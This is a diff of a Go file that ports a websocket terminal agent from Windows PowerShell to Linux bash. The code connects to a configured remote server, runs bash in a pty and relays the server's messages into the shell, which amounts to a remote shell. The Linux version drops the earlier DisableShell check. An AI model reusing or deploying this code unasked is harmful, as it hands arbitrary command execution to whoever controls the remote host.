@@ -1,31 +1,26 @@
-//go:build windows
-// +build windows
+//go:build linux
+// +build linux
 
-package cmd
+package main
 
 import (
 	"net/url"
 	"os"
+	"os/exec"
 	"strings"
-	"syscall"
 	"time"
 
-	"github.com/ActiveState/termtest/conpty"
+	"github.com/creack/pty"
 	"github.com/gorilla/websocket"
 )
 
-func StartSocketWin() {
-	if mc.Config.DisableShell {
-		return
-	}
-
-	cpty, _ := conpty.New(100, 50)
+func StartSocketLin() {
 	var disconnected bool
-	remoteURL, _ := url.Parse(mc.Config.Remote)
+	remoteURL, _ := url.Parse(conf.Remote)
 
 	readTeamID()
-	curTeamID := string(mc.TeamID)
-	u := url.URL{Scheme: "ws", Host: remoteURL.Host, Path: "/ws/" + curTeamID + "-" + mc.Config.Name}
+	curTeamID := string(teamID)
+	u := url.URL{Scheme: "ws", Host: remoteURL.Host, Path: "/ws/" + curTeamID + "-" + conf.Name}
 
 	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
 	if err != nil {
@@ -38,27 +33,20 @@ func StartSocketWin() {
 	}
 	defer c.Close()
 
-	cpty.Spawn(
-		"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-		[]string{},
-		&syscall.ProcAttr{
-			Env: os.Environ(),
-		},
-	)
+	cmd := exec.Command("bash")
+	cmd.Env = append(os.Environ(), "TERM=xterm")
+	term, _ := pty.Start(cmd)
 
 	go func() {
 		for {
 			if !disconnected {
 				buf := make([]byte, 512)
-				_, err := cpty.OutPipe().Read(buf)
+				_, err := term.Read(buf)
 				if err != nil {
-					cpty.Spawn(
-						"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-						[]string{},
-						&syscall.ProcAttr{
-							Env: os.Environ(),
-						},
-					)
+					cmd = exec.Command("bash")
+					cmd.Env = append(os.Environ(), "TERM=xterm")
+					term, _ = pty.Start(cmd)
+
 					continue
 				}
 
@@ -84,15 +72,12 @@ func StartSocketWin() {
 				}
 			}
 
-			_, err = cpty.Write([]byte(message))
+			_, err = term.Write([]byte(message))
 			if err != nil {
-				cpty.Spawn(
-					"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-					[]string{},
-					&syscall.ProcAttr{
-						Env: os.Environ(),
-					},
-				)
+				cmd = exec.Command("bash")
+				cmd.Env = append(os.Environ(), "TERM=xterm")
+				term, _ = pty.Start(cmd)
+
 				continue
 			}
 		} else {
@@ -100,8 +85,8 @@ func StartSocketWin() {
 			case <-ticker.C:
 				if disconnected {
 					readTeamID()
-					curTeamID := string(mc.TeamID)
-					u = url.URL{Scheme: "ws", Host: remoteURL.Host, Path: "/ws/" + curTeamID + "-" + mc.Config.Name}
+					curTeamID := string(teamID)
+					u = url.URL{Scheme: "ws", Host: remoteURL.Host, Path: "/ws/" + curTeamID + "-" + conf.Name}
 
 					c, _, err = websocket.DefaultDialer.Dial(u.String(), nil)
 					if err != nil {
